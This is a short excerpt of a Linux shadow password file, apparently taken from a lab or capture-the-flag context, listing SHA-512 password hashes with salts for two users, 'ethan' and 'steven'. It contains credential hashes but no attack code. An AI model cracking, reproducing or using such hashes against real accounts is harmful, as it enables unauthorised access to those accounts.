ethan:$6$7ZmNCkavGVnqDtRI$DXwHR.p1AXlIwDsoi20wpd57ZQL4doguuNxh4XY.vzX8wwnD8uz5Gz2AG6tWDEDfsO8CQFOYgEHg/riNHOJ4k0:19099:0:99999:7:::
steven:$6$Czg9.c1hcgYo7ON4$ogez7L7bCGFTURA4LcPv8A5CWdGufpkI4QHhSfKtZUMq2vzT7hKP/.DSDRXSQBWzgvVTnIpY/jG.zYFIgWFXD.:19099:0:99999:7:::
```
